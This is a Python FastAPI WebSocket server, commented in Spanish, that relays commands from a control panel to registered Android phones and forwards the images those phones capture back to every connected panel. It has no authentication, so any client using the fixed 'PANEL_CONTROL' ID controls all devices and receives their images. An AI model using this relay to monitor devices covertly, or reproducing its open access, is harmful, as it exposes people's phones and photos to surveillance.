from fastapi import FastAPI, WebSocket, WebSocketDisconnect
import json

app = FastAPI()

# Diccionarios para gestionar las conexiones activas
# { "ID_6_CHARS": websocket_object }
dispositivos_activos = {}
paneles_control = []

@app.get("/")
async def root():
    return {"status": "Servidor activo para Control Android"}

@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    
    # Diferenciamos si se conecta el PANEL o un CELULAR
    if client_id == "PANEL_CONTROL":
        paneles_control.append(websocket)
        print("Panel de control conectado.")
    else:
        # Es un celular, lo registramos con su ID de 6 caracteres
        dispositivos_activos[client_id] = websocket
        print(f"Dispositivo registrado: {client_id}")
        # Avisar al panel que hay un nuevo dispositivo
        await notificar_paneles({"tipo": "nuevo_dispositivo", "id": client_id})

    try:
        while True:
            data = await websocket.receive_text()
            mensaje = json.loads(data)

            # Caso A: El Panel envía una orden a un celular específico
            if client_id == "PANEL_CONTROL":
                target_id = mensaje.get("target_id")
                if target_id in dispositivos_activos:
                    await dispositivos_activos[target_id].send_text(json.dumps(mensaje))
            
            # Caso B: El Celular envía la imagen capturada de vuelta
            else:
                # Reenviamos la imagen recibida a todos los paneles conectados
                for panel in paneles_control:
                    await panel.send_text(json.dumps({
                        "tipo": "imagen_recibida",
                        "device_id": client_id,
                        "image_data": mensaje.get("image_data") # Base64
                    }))

    except WebSocketDisconnect:
        if client_id == "PANEL_CONTROL":
            paneles_control.remove(websocket)
        else:
            if client_id in dispositivos_activos:
                del dispositivos_activos[client_id]
                await notificar_paneles({"tipo": "dispositivo_desconectado", "id": client_id})
        print(f"Cliente {client_id} desconectado.")

async def notificar_paneles(data):
    for panel in paneles_control:
        try:
            await panel.send_text(json.dumps(data))
        except:
            pass